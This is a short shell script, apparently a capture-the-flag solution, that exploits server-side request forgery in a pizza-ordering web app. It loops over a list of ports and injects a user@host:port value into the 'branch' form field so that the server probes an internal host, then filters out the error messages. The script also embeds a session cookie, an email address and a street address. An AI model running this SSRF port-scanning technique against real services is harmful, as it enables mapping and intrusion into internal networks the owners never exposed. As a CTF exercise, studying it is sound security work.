#!/bin/sh

while read p; do
echo "${p}"
curl --silent 'https://pizza.hacktivity.h1ctf.com/order' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Cookie: session=19e60372558c97fc15ef812f998d1f95' \
  --data-raw "branch=3281.branch.internal.pizza.hacktivity.h1ctf.com@3281.branch.internal.pizza.hacktivity.h1ctf.com:${p}?&address%5Bline_1%5D=925+Jones+Street&address%5Bline_2%5D=Apt+305&address%5Bline_3%5D=&address%5Bcity%5D=San+Francisco&address%5Bstate%5D=CA&address%5Bzipcode%5D=94109&email=zoeygarvey%40gmail.com&discount_code=" | python -mjson.tool | grep error_msg | sed 's/    "error_msg": "Remote Response: //'
done < ports
